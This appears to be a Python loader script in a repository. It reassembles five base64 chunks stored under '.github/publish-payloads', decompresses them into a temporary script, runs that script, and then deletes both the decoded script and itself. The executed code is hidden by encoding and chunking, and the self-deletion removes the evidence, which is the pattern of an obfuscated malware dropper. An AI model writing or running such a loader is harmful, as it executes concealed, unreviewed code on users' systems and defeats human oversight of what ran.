from pathlib import Path
import base64
import runpy
import zlib

site_dir = Path(__file__).resolve().parent
repo_dir = site_dir.parent
payload_dir = repo_dir / ".github" / "publish-payloads"
parts = sorted(payload_dir.glob("hipobuyvip-net-20260805-*.b64"))
assert len(parts) == 5, f"Expected 5 payload chunks, found {len(parts)}"
encoded = "".join(path.read_text(encoding="utf-8").strip() for path in parts)
runtime_script = payload_dir / "hipobuyvip-net-20260805-runtime.py"
runtime_script.write_bytes(zlib.decompress(base64.b64decode(encoded)))
try:
    runpy.run_path(str(runtime_script), run_name="__main__")
finally:
    runtime_script.unlink(missing_ok=True)
    Path(__file__).unlink(missing_ok=True)
